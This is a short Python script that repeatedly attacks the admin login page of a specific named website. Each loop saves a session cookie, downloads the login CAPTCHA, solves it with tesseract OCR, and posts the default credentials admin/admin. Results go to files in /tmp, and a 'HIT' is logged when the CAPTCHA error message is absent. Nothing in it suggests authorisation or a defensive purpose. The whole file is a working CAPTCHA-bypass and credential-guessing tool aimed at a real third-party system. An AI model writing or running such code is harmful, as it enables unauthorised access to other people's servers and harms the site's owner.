import subprocess, re, time, os

for i in range(100):
    try:
        subprocess.run(["curl","-sk","--connect-timeout","8","http://yurundianqi.com/admin.php","-c","/tmp/yl3.txt","-b","/tmp/yl3.txt","-o","/dev/null"],timeout=10)
        subprocess.run(["curl","-sk","--connect-timeout","8","http://yurundianqi.com/admin.php?s=/Login/verify/id/a_login_1","-b","/tmp/yl3.txt","-o","/tmp/yl3.png"],timeout=10)
        subprocess.run(["tesseract","/tmp/yl3.png","/tmp/yl3_ocr","-c","tessedit_char_whitelist=0123456789","--psm","7"],timeout=5)
        code=open("/tmp/yl3_ocr.txt").read().strip().replace(" ","").replace("\n","")
        r=subprocess.run(["curl","-sk","--connect-timeout","8","-L","http://yurundianqi.com/admin.php?s=/Login/login","-X","POST","-d",f"username=admin&password=admin&code={code}","-b","/tmp/yl3.txt"],capture_output=True,text=True,timeout=10)
        s="WRONG"
        if "验证码不正确" not in r.stdout:
            s=f"HIT:{r.stdout[:100]}"
            open("/tmp/YL_HIT.txt","w").write(f"CODE={code}\n{r.stdout}")
        open("/tmp/yl3_result.txt","a").write(f"{i}: OCR={code} {s}\n")
    except: pass
    time.sleep(1.5)
